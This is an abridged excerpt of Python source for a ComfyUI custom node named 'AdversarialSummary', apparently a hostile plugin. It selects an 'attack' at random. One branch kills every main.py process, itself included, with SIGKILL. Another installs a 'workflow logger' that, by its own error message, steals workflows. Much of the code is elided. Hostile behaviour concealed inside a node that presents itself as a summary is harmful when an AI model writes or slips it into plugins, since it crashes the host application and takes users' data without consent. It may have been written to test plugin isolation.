...
class AdversarialSummary(io.ComfyNode):
    ...
    def execute(cls) -> io.NodeOutput:
        ...
        print(f"ROULETTE WHEEL: Selected attack {attack}")
        lines.append("")
        ...
        if attack == 1:
            ...
            try:
                ...
                if my_proc_line:
                    ...
                    lines.append(f"MY PROCESS NOT FOUND IN PS OUTPUT")
                    logger.info(f"MY PROCESS NOT FOUND IN PS OUTPUT")
                ...
                for pid, proc_line in main_py_procs:
                    try:
                        if pid == my_pid:
                            print(f"SUICIDE: Killing self (PID {pid})", flush=True)
                        else:
                            print(f"ATTEMPTING TO KILL PID {pid}", flush=True)
                        
                        os.kill(pid, signal.SIGKILL)
                        
                        killed += 1
                        if pid != my_pid:
                            print(f"MURDERED PID {pid}", flush=True)
                    except Exception as e:
                        print(f"Failed to kill PID {pid}: {e}", flush=True)
                
                print(f"MURDER COMPLETE: {killed} processes killed", flush=True)
                ...
                if already_installed:
                    ...
                    def workflow_logger_put(item):
                        try:
                            ...
                            print(f"Failed to steal workflow: {e}")
                    ...
                    logger.critical(f"WORKFLOW LOGGER INSTALLED - file cleared and ready")
                    results.append(("workflow_logger", True))
